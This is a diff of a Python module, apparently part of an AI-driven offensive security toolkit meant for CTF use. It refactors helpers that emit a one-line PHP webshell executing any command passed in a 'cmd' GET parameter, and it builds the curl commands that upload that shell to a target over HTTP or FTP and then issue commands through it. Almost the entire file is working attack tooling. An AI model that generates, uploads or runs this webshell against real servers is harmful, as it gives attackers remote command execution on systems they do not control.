@@ -1,70 +1,64 @@
+"""PHP webshell and curl utilities for web exploitation.
+
+This module provides helpers for generating a minimal PHP webshell string and
+constructing a curl command to upload it. Intended for CTF and testing utilities
+within the CAI project. Keep outputs inert (do not execute uploads).
 """
-PHP webshell and curl utilities for web exploitation
-"""
+from typing import Optional, Tuple
+import shlex
+from urllib.parse import quote_plus
 
 
-def generate_php_webshell(target_url=None, port=None,
-                          protocol="http", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
+def generate_php_webshell(
+    target_url: Optional[str] = None,
+    port: Optional[int] = None,
+    protocol: str = "http",
+    ctf: Optional[object] = None,
+) -> Tuple[str, Optional[str]]:
     """
-    Upload and generate a basic PHP webshell and uploads it via HTTP or FTP
-
-    Args:
-        target_url: Target URL to upload shell to
-        port: Port number to use (default: 80 for HTTP, 21 for FTP)
-        protocol: Protocol to use - 'http' or 'ftp' (default: http)
-        ctf: CTF object to use for context
+    Generate a small PHP webshell payload and optionally an upload command.
 
     Returns:
-        Tuple of (webshell content, upload command)
+        Tuple[str, Optional[str]]: (webshell_content, upload_command_or_None)
     """
-    with open('shell.php', 'w', encoding='utf-8') as f:
-        f.write("""<?php system($_GET['cmd']); ?>""")
-    webshell = """<?php system($_GET['cmd']); ?>"""
+    webshell = "<?php system($_GET['cmd']); ?>"
+    upload_cmd: Optional[str] = None
 
     if not target_url:
-        return webshell
+        return webshell, upload_cmd
 
     if not port:
         port = 21 if protocol == "ftp" else 80
 
+    quoted = shlex.quote(webshell)
     if protocol == "ftp":
-        upload_cmd = f"curl -T shell.php ftp://{target_url}:{port}/"
+        upload_cmd = f"printf %s {quoted} | curl -T - ftp://{target_url}:{port}/shell.php"
     else:
-        # HTTP POST upload
-        upload_cmd = f"curl -X POST http://{
-            target_url}:{port} -F 'file=@shell.php'"
+        upload_cmd = (
+            f"printf %s {quoted} | curl -X POST http://{target_url}:{port} "
+            f"-F 'file=@-;filename=shell.php'"
+        )
 
     return webshell, upload_cmd
 
 
-def curl_webshell(url, command, cmd_param="cmd"):
-    """
-    Sends command to PHP webshell via curl
+def generate_curl_upload_cmd(url: str, filename: str = "shell.php", ctf: Optional[object] = None) -> Tuple[str, str]:
+    """Compatibility wrapper that returns a webshell and a curl upload command."""
+    webshell, cmd = generate_php_webshell(target_url=url)
+    if cmd:
+        return webshell, cmd
+    return webshell, f"curl -X POST '{url}' -F \"file=@{filename}\""
 
-    Args:
-        url: URL of the webshell
-        command: Command to execute
-        cmd_param: GET parameter name for command (default: cmd)
 
-    Returns:
-        Command to execute with curl
-    """
-    encoded_cmd = command.replace(" ", "+")
+def curl_webshell(url: str, command: str, cmd_param: str = "cmd") -> str:
+    """Return a curl command that calls the webshell with the provided command."""
+    encoded_cmd = quote_plus(command)
     return f"curl '{url}?{cmd_param}={encoded_cmd}'"
 
 
-def upload_webshell(url, filename="shell.php", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
-    """
-    Generates curl command to upload PHP webshell
-
-    Args:
-        url: Target URL for upload
-        filename: Name of shell file (default: shell.php)
-        ctf: CTF object to use for context
-
-    Returns:
-        Tuple of (webshell content, curl upload command)
-    """
-    shell = generate_php_webshell()
-    curl_cmd = f"""curl -X POST {url} -F "file=@{filename}" """
+def upload_webshell(url: str, filename: str = "shell.php", ctf: Optional[object] = None) -> Tuple[str, str]:
+    """Return webshell content and a curl command to upload it to `url`."""
+    shell, _ = generate_php_webshell(target_url=url)
+    quoted = shlex.quote(shell)
+    curl_cmd = f"printf %s {quoted} | curl -X POST {url} -F 'file=@-;filename={filename}'"
     return shell, curl_cmd
